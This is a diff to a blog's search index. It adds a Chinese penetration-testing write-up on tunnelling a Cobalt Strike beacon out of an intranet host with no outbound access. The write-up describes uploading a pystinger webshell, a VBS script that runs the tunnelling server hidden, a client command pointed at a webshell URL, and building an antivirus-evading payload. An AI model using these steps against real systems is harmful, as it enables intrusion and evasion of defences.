@@ -2505,4 +2505,45 @@
         <tag>PWN学习</tag>
       </tags>
   </entry>
+  <entry>
+    <title>记录一次内网不出网cs上线渗透操作过程</title>
+    <url>/2021/11/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91cs%E4%B8%8A%E7%BA%BF%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h1 id="记录一次内网不出网cs上线渗透"><a class="markdownIt-Anchor" href="#记录一次内网不出网cs上线渗透"></a> 记录一次内网不出网cs上线渗透</h1>
+<h2 id="0x00"><a class="markdownIt-Anchor" href="#0x00"></a> 0x00</h2>
+<p>因为遇到一个不出网的站并且拿到了shell，就想试试免杀上线cs。</p>
+<h2 id="0x01-pystinger使用"><a class="markdownIt-Anchor" href="#0x01-pystinger使用"></a> 0x01 pystinger使用</h2>
+<p>这次用的是<a href="https://github.com/FunnyWolf/pystinger">FunnyWolf/pystinger: Bypass firewall for traffic forwarding using webshell 一款使用webshell进行流量转发的出网工具 (github.com)</a> ，来实现的。</p>
+<p><strong>1.首先在站点上传他们的服务端的webshell，访问后会显示以下情况。</strong></p>
+<p>![image-20211129104341833](D:\onedrive\OneDrive - a5042\博客\记一次内网不出网的cs上线渗透\image-20211129104341833.png)</p>
+<p><strong>2.然后需要在目标机器上运行stinger_server.exe</strong></p>
+<p>这里参考网上文章，先把stinger_server.exe上传到服务器，这里创建一个vbs文件，内容如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Set ws = CreateObject(&quot;Wscript.Shell&quot;)<br>ws.run &quot;cmd /c C:\xxx\xxx\stinger_server.exe 0.0.0.0&quot;,vbhide<br></code></pre></td></tr></table></figure>
+<p>上传vbs文件后运行即可</p>
+<img src="/2021/11/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91cs%E4%B8%8A%E7%BA%BF%E6%B8%97%E9%80%8F/onedrive\OneDrive - a5042\博客\记一次内网不出网的cs上线渗透\image-20211129110545112.png" alt="image-20211129110545112" style="zoom:80%;">
+<p>直接运行vbs文件即可，然后用tasklist查看一下进程是否有stinger_server.exe</p>
+<p><strong>3.然后在vps上启动stinger_client，命令</strong></p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/stinger_client -w http:/</span><span class="hljs-regexp">/example.com:8080/</span>proxy.jsp(webshell路径) -l <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> -p <span class="hljs-number">60000</span><br></code></pre></td></tr></table></figure>
+<img src="/2021/11/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91cs%E4%B8%8A%E7%BA%BF%E6%B8%97%E9%80%8F/onedrive\OneDrive - a5042\博客\记一次内网不出网的cs上线渗透\image-20211129105046596.png" alt="image-20211129105046596" style="zoom:80%;">
+<h2 id="0x02-cs使用"><a class="markdownIt-Anchor" href="#0x02-cs使用"></a> 0x02 CS使用</h2>
+<p>上面操作进行完之后，需要在cs中创建一个监听器，host填的是目标机器的内网ip地址</p>
+<img src="/2021/11/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91cs%E4%B8%8A%E7%BA%BF%E6%B8%97%E9%80%8F/onedrive\OneDrive - a5042\博客\记一次内网不出网的cs上线渗透\image-20211129111155364.png" alt="image-20211129111155364" style="zoom:67%;">
+<p>对了，这台机器使用tasklist看到有360的进程，所以就顺便试了免杀，用的是<a href="https://github.com/1y0n/AV_Evasion_Tool">1y0n/AV_Evasion_Tool: 掩日 - 免杀执行器生成工具 (github.com)</a></p>
+<img src="/2021/11/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91cs%E4%B8%8A%E7%BA%BF%E6%B8%97%E9%80%8F/onedrive\OneDrive - a5042\博客\记一次内网不出网的cs上线渗透\image-20211129110152221.png" alt="image-20211129110152221" style="zoom: 50%;">
+<p>然后cs导出c的payload，拖入生成exe。</p>
+<p>上传后直接运行，cs里显示上线是127.0.0.1</p>
+<img src="/2021/11/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91cs%E4%B8%8A%E7%BA%BF%E6%B8%97%E9%80%8F/onedrive\OneDrive - a5042\博客\记一次内网不出网的cs上线渗透\image-20211129164424229.png" alt="image-20211129164424229" style="zoom:67%;">
+]]></content>
+      <categories>
+        <category>web学习</category>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>web学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>（CVE-2018-6893）Finecms 5.2.0 SQL注入漏洞（dns注入+时间盲注）记录</title>
+    <url>/2021/11/26/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[]]></content>
+  </entry>
 </search>
